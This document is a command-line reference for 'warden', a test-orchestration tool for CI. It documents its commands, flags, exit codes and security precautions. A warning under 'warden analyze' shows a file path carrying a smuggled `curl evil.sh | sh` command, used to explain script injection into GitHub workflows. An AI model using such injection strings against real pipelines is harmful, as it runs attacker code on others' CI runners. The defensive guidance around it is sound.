# CLI Reference

The `warden` binary composes the whole platform for local runs and CI steps.

## Installing

**`@warden/cli` is not published to npm yet.** `npm install @warden/cli` returns a 404, and
so does any `npx` form of it. Until the first release, build it from source — that is what
this repository's own QA workflow does:

```bash
git clone https://github.com/QuintinBotes/warden.git
cd warden
pnpm install --frozen-lockfile
pnpm -w build
```

That leaves an executable at `packages/cli/dist/bin/warden.js`. Run it from any repository:

```bash
node /path/to/warden/packages/cli/dist/bin/warden.js init
```

If you'd rather type `warden`, alias it:

```bash
alias warden="node /path/to/warden/packages/cli/dist/bin/warden.js"
warden --version
```

Once `@warden/cli` is published, the one-off form will be:

```bash
npx --yes --package=@warden/cli -- warden <command>
```

Name the package. **Do not run `npx warden`**: on npm the unscoped name `warden` belongs to an
unrelated package from 2014 that declares no executable, so npx downloads a stranger's tarball
and then fails with "could not determine executable to run".

All commands read `warden.config.ts` from the current directory (see [Configuration](configuration.md)). The file is **parsed as data, never executed** — it comes from the repository under test, and `warden agent` runs with your API key in its environment. A config that needs computed values requires `WARDEN_TRUST_CONFIG=1`, which is only safe on a checkout you vouch for.

The examples below spell the command as `warden <subcommand>` — substitute whichever of the two
invocations above you are using.

## `warden analyze`

Compute the change surface of a diff and emit GitHub-Actions outputs.

```bash
warden analyze --base origin/main --head HEAD --output "$GITHUB_OUTPUT"
```

| Flag | Description |
|------|-------------|
| `--base <sha>` | Base ref to diff against. |
| `--head <sha>` | Head ref. |
| `--output <file>` | Where to write `key=value` outputs. Omit to print to stdout. |

Emits:

```
test_tags=@apps/checkout @lib/auth
risk_score=7
run_full_suite=false
configured=true
```

`run_full_suite` is `true` when the diff touches shared/infrastructure paths.

> **`test_tags` is pull-request-controlled — bind it to `env:`, never interpolate it.**
> A tag is `tagPrefix` plus the first two segments of a changed file's own path, so whoever
> opened the pull request chose the text. GitHub substitutes `${{ … }}` into a `run:` script
> before the shell parses it, which would make a branch adding
> `apps/$(curl evil.sh | sh)/page.tsx` arbitrary code on your runner. Pass the value through
> an environment variable and read it as `"$VAR"`:
>
> ```yaml
> - env:
>     TEST_TAGS: ${{ needs.analyze.outputs.test_tags }}
>   run: npx --yes --package=@warden/cli -- warden run --grep "$TEST_TAGS"    # not: --grep "${{ … }}"
> ```
>
> The workflow `warden init` scaffolds already does this.

`configured` is `false` when the repository has no `warden.config`. (A `.wardenrc` does not count: the loader reads config files as data rather than executing them, and that lookup only ever existed in the executing loader.) Because
every field has a default, an absent config produces exactly the same score as an empty one, so
this line is the only thing that separates *"this repository chose the defaults"* from *"nobody
ever configured this repository"*. When it is `false`, `warden analyze` also writes a warning to
stderr, and the GitHub Action repeats it in the PR comment and the job summary. The numbers are
still emitted — Warden runs without a config — they are just labelled as defaults.

`test_tags` comes from the modules the diff touched, and a module is a changed file under one
of [`scope.modulePaths`](configuration.md#scopemodulepaths--where-your-modules-live) — `apps/`
and `src/features/` unless you say otherwise. When no changed file matches, `test_tags=` is
empty and Warden writes to **stderr** why:

```
warden analyze: No changed file is under any scope.modulePaths prefix (apps/, src/features/),
so the selective tier has no tags for this diff. If this repo's modules do not live there, set
scope.modulePaths in warden.config.ts to the roots they do live under.
```

The output lines are unchanged by this — a parser reading `$GITHUB_OUTPUT` sees the same three
keys. Note that an empty tag list is not an empty test run: `warden run --grep ""` drops the
filter and runs everything, so a "selective" job handed empty tags silently runs the full
suite. Set `scope.modulePaths` rather than relying on that.

## `warden run`

Run tests (scoped by tag), write a CTRF report, and invoke the configured reporters.

```bash
warden run --grep "@apps/checkout" --artifacts-dir ./artifacts
```

| Flag | Description |
|------|-------------|
| `--grep <tags>` | Playwright tag expression to scope the run. |
| `--artifacts-dir <dir>` | Where CTRF, screenshots, and videos are written. Default `warden-artifacts`. |
| `--output <file>` | Write the CTRF report to this exact path instead of `<artifacts-dir>/ctrf-report.json`. |
| `--base <sha>` / `--head <sha>` | Diff bounds: scope the a11y/performance tiers and the CUJ gate to what changed. |
| `--base-url <url>` | Preview/staging URL for those route-scoped tiers (or `$WARDEN_BASE_URL`). |
| `--impact-index <path>` | Coverage index JSON; narrows the run to the tests the diff impacts. |
| `--db <path>` | SQLite store to persist the run into (flake history, dashboard). |

Use `--output` when several tiers must end up side by side in one directory for
`warden report aggregate`, which merges every `*.json` directly inside `--reports`:

```bash
warden run --grep "@smoke"      --output warden-reports/smoke.ctrf.json
warden run --grep "@regression" --output warden-reports/regression.ctrf.json
warden report aggregate --reports warden-reports --pr 123
```

Only CTRF reports may live in that directory — an agent report or any other JSON dropped
beside them fails the merge.

`--grep` is handed to Playwright unchanged, so it is a **regex** — the tag expression you write is
the pattern Playwright compiles.

Retry rounds do not work that way. When `flake.retry` is enabled and tests fail, Warden re-runs
just the failing subset by building its own `--grep` from those tests' titles, and each title is
**regex-escaped** before it is joined into the alternation. A title containing `[`, `(`, `|`, `.`
or any other metacharacter therefore matches itself literally: the retry re-runs exactly the tests
that failed, and a title that is not a valid regex on its own (`cart [a+ unclosed`) cannot break
the run.

The last line on stdout is the tier's gate decision, and it is also the exit code:

```
wrote CTRF report to ./artifacts/ctrf-report.json
gate: BLOCK — 1 test(s) failed
```

`warden run` exits `1` when that decision is `BLOCK`, so a bare `warden run` step fails its CI job on a red tier. The test runner's own exit status is deliberately ignored — Warden needs the JSON report from a failing run too — so the gate is what the exit code reports. `PASS` and `WARN` both exit `0`, and a run in which no test ran at all is `WARN`: it does not fail the step. Use `warden report aggregate` for a merge decision across several tiers.

In a multi-job workflow the tier steps usually want `continue-on-error: true` so the aggregate
step, not the tier, is the merge verdict — that is what `warden init` scaffolds. See
[Exit codes](#exit-codes).

The last line it prints is the gate this run reached — failed tests, quarantine churn, and the
a11y, performance and CUJ tiers folded in worst-of:

```
wrote CTRF report to warden-artifacts/ctrf-report.json
gate: BLOCK — 1 test(s) failed
```

A `BLOCK` exits `1` (see [Exit codes](#exit-codes)), so the step that ran it fails. A tier step
that must not stop the rest of the pipeline needs `continue-on-error: true`, or the jobs after it
need `if: always()` — the workflow `warden init` scaffolds takes the second route, so a red tier
still reaches the gate that reports it.

### Playwright has to be installed — Warden will not fetch it

`warden run` launches the Playwright CLI the project installed: the nearest
`node_modules/.bin/playwright` at or above the working directory (so a workspace-root install
serves every package in the monorepo). Nothing is downloaded to fill a gap. A repo with no
Playwright gets an error naming the directory that was searched and what to install, and the
command exits `1` without writing a CTRF report:

```
warden: Playwright is not installed in /repo (no node_modules/.bin/playwright here or in
any parent). Warden runs the Playwright the project installed and never downloads one …
```

Failing is the honest answer. Warden used to shell out to `npx playwright`, and `npm exec`
cannot prompt in CI or any other non-TTY invocation, so it installed the package silently and
ran it against a repo with no Playwright config and no specs. The zero-test report that came
back became a gate WARN — "no tests ran" — and the job went green having tested nothing.

| Environment variable | Description |
|----------------------|-------------|
| `WARDEN_PLAYWRIGHT_BIN` | Absolute path to a Playwright CLI outside the project's `node_modules` — a global install, or one baked into a container image. It takes precedence over the project's own copy, and a path that does not exist is an error rather than a fallback. |

## `warden agent`

Run one AI agent strategy against a running app.

```bash
warden agent --strategy exploratory --url http://localhost:3000 \
  --pr-number 123 --output exploratory-report.json
```

| Flag | Description |
|------|-------------|
| `--strategy <name>` | `exploratory`, `generative`, or `healer`. |
| `--url <url>` | Preview URL for the running app. |
| `--pr-number <n>` | PR number, for report context. |
| `--output <path>` | Where the JSON report is written. |
| `--provider <name>` | Override `ai.provider` for this run: `anthropic`, `openai`, `gemini`, or `ollama`. An unknown name is an error. |
| `--model <id>` | Override `ai.model` for this run (and `ai.ollama.model` when the provider is `ollama`). |
| `--stub-provider` | Call no model. For exercising the wiring; the report says it is not a result. |

`--provider` and `--model` exist for callers that cannot edit the repo's `warden.config.*` — CI
passing an input through, for one. A provider name outside the four above is an error, not a
fallback: running against a provider you did not ask for and reporting it as if it were honoured
is worse than stopping.

### `warden agent` needs credentials, and will not pretend otherwise

The provider comes from `ai.provider` in your config, and its key is read from that provider's
own variable — `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, or `GEMINI_API_KEY` / `GOOGLE_API_KEY`.
`ollama` needs none; it talks to a local daemon.

With no usable credential, `warden agent` exits `1`, names the variable to set, and **writes no
report**. It does not fall back to a stub. A stubbed run produces an `AgentOutput` byte-identical
to a real run that found nothing — empty `findings`, "No issues were found during exploration.",
exit `0` — so a silent substitution turns a refusal into a clean bill of health.

To run without an API key, use a local model:

```ts
export default defineConfig({
  ai: { provider: 'anthropic', fallbackProvider: 'ollama' },
});
```

`--stub-provider` still exists for smoke-testing the plumbing, but is opt-in and never quiet: it
warns on stderr, sets `provider: "stub"` in the JSON, and opens `markdownReport` with a banner
saying no model was called.

Every report now carries `provider` — `"anthropic"`, `"openai"`, `"gemini"`, `"ollama"`, or
`"stub"` — and the success line on stdout names it too:

```
wrote agent report to report.json (provider: anthropic)
```

> `--provider` accepts only the four names above. An unrecognised one fails the command by name rather than quietly falling back to the configured provider — a run has to be attributable to the model that produced it.

## `warden report`

Aggregate CTRF reports and post the QA gate decision.

```bash
warden report aggregate --reports ./reports --pr 123
```

| Flag | Description |
|------|-------------|
| `aggregate` | Merge every CTRF report at or below `--reports` into one. |
| `--reports <dir>` | Directory to read CTRF reports from, **searched recursively**. JSON that is not a CTRF report is skipped. |
| `--pr <n>` | PR to comment on (needs `GITHUB_TOKEN`). |
| `--artifacts-dir <dir>` | Directory recorded in the report context. Defaults to `--reports`. |
| `--head-sha <sha>` | Commit the check run attaches to. Defaults to `$GITHUB_SHA` / `$CI_COMMIT_SHA`. |
| `--json` | Print the machine-readable gate report on stdout instead of the human line. |

What the command posts, and what it exits with:

- **A PR comment** with the merged report and the gate decision.
- **A check run** named `Warden QA` — `failure` on `BLOCK`, `neutral` on `WARN`, `success` on
  `PASS`. This is the half a branch protection rule can require; the comment enforces nothing.
  It needs a head SHA; without one the check run is skipped rather than attached to a guessed
  commit. Turn it off with
  [`reporting.checkRunAnnotations: false`](configuration.md#reporting--where-results-go).
- On a `pull_request` event, `$GITHUB_SHA` is the **merge** commit, and a required status check
  is read off the PR's **head** commit. Pass `--head-sha "${{ github.event.pull_request.head.sha }}"`
  there — the workflow `warden init` scaffolds does.
- **Exit code `1` on `BLOCK`**, so the CI step running it fails. This is the guard that does not
  depend on any API call succeeding, and it is what makes the `qa-gate` job in the workflow
  `warden init` scaffolds go red.

It prints the aggregated decision and exits on it:

```
gate: BLOCK — 1 test(s) failed
```

This is the merge gate. Run it as its own step, with no `continue-on-error`, and its exit
code fails the PR check.

Without `--json`, stdout is one sentence meant for a person:

```
gate: PASS — All tests passed
```

With `--json`, stdout is **only** the gate report and that same sentence moves to stderr, so a
CI step can parse stdout without stripping log noise out of it:

```json
{
  "gate": { "decision": "BLOCK", "reason": "1 test failed" },
  "summary": { "total": 12, "passed": 11, "failed": 1 },
  "failures": [
    {
      "path": "tests/checkout.spec.ts",
      "message": "expected 10, got 0",
      "title": "checkout applies a discount"
    }
  ]
}
```

`gate` is the only field always present. `summary` is the same count the human line and the PR
comment are built from, and `failures` lists only failing tests the runner gave a file for — a
failure with no file is still counted in `summary` but cannot be annotated against a diff. The
shape is `GateReport` in `@warden/core`, which is the type both this CLI and the GitHub Action
compile against; anything reading it should treat every field but `gate` as optional.

The search is recursive because reports do not arrive flat. Each tier writes to its own
`--artifacts-dir` (`warden-artifacts/smoke`, `warden-artifacts/selective`), and
`actions/download-artifact` unpacks each uploaded artifact into a directory of its own
under the download path — so on the gate runner every CTRF file is nested at least one
level down. Every `*.json` found is parsed as CTRF, so keep non-CTRF JSON (such as
`warden agent`'s `AgentOutput`) out of the tree you point `--reports` at.

A `--reports` directory that does not exist is an error, not an empty result: a gate that
cannot read its inputs must not report a verdict. A directory that exists but holds no
CTRF file aggregates to `WARN "no tests ran"` and exits `0`, so a CI job that downloads
artifacts should check it actually got some — the workflow `warden init` scaffolds does.

Prints the merged decision and exits on it:

```
gate: BLOCK — 1 test(s) failed
```

`--reports` is normally your artifacts directory, which holds more than test reports:
`warden agent --output warden-artifacts/exploratory-report.json` writes an agent report there,
and `warden run` writes `fixture-catalog.json`. Aggregation reads only the files that are CTRF
reports — a top-level `results` object — and ignores the rest, so those artifacts never stop the
gate reaching a decision. A file that *is* a CTRF report but does not match the schema fails the
command, naming the file and the fields at fault: skipping it would drop real test results and
report a smaller run than actually happened.

## `warden plan`

Emit a canonical Test Plan (Markdown) with objective, scope, entry/exit criteria, and risk sections.

```bash
warden plan --name "Checkout v2" > TEST-PLAN.md
```

## `warden init`

Scaffold configuration into the current repository.

```bash
warden init
warden init --force        # replace customized files without asking
```

| Flag | Description |
|------|-------------|
| `--cwd <dir>` | Directory to scaffold into. Defaults to the current directory. |
| `--force` | Replace files that exist and differ from the template, without asking. |

Writes `warden.config.ts` and `.github/workflows/ai-qa.yml`. Safe to re-run in an existing repo:
each file is decided on its own and one line per file says what happened.

| Line | What it means |
|------|---------------|
| `created <path>` | The file was not there; it was written. |
| `unchanged <path>` | Already byte-identical to the template. Nothing was written. |
| `overwrote <path>` | You confirmed the replacement, or passed `--force`. |
| `kept <path>` | The file exists and differs, and nothing confirmed replacing it. **It was not touched.** |

A file that exists and differs from the template is only replaced when you say so. In a terminal,
`init` asks per file (`Overwrite? [y/N]`) and the default is no. With input or output redirected —
CI, a pipe, `< /dev/null` — there is nobody to ask, so the file is kept and the run says
`re-run with --force to replace it`. `init` never exits non-zero for keeping a file: nothing
failed, and your config is intact.

There is no backup file. `--force` is not recoverable, so commit before you use it.

The scaffolded workflow runs each tier as its own job, so each tier gets its own runner
and its own empty filesystem. Every tier therefore uploads its CTRF with
`actions/upload-artifact` under a `warden-ctrf-*` name, and the `qa-gate` job downloads
that pattern back into `warden-artifacts/` before aggregating. The agent report is
uploaded separately as `warden-agent-exploratory` — it is an `AgentOutput`, not CTRF, and
it does not contribute to the merge decision.

Every workflow expression the scaffolded `ai-qa.yml` needs in a command is bound to an `env:`
variable and read as `"$VAR"` rather than interpolated into the script — see the note under
[`warden analyze`](#warden-analyze). If you adapt the workflow, keep that shape.

## Exit codes

| Code | Meaning |
|------|---------|
| `0` | Success, or gate decision `PASS`/`WARN`. |
| `1` | Gate decision `BLOCK`, or a command error — including `warden agent` with no provider credentials. |

Use the exit code to fail a CI step when the gate blocks:

```bash
warden report aggregate --reports ./reports --pr 123   # exits 1 on BLOCK
```

Two commands compute a gate and therefore honour this: `warden run` (the tier it just ran) and
`warden report aggregate` (every CTRF file it merged). The rest exit `0` unless they error. Both
print the decision they exited on first, and everything the command was asked to produce is
written before it exits: the CTRF report, the PR comment, the check run. A non-zero exit means
"the gate blocked", never "the work did not happen" — which is why the Action reads the gate
report out of a run that exited `1` instead of reporting it as a crashed step.

`WARN` exits `0` on purpose — a warning that fails the build is a block, and the gate has a
separate decision for that. Raise `gates.blockOnPassRateBelowPercent` (see
[Configuration](configuration.md)) if you want a warning-level result to stop a merge.

`PASS` and `WARN` leave the exit code alone rather than writing a `0` over it, so a command that
reached a green gate but failed at something else — a reporter that could not reach GitHub, say —
still exits non-zero.

The exit code is set, not `process.exit()`d, so stdout — including the `gate:` line that
explains the failure — is always flushed before the process ends.
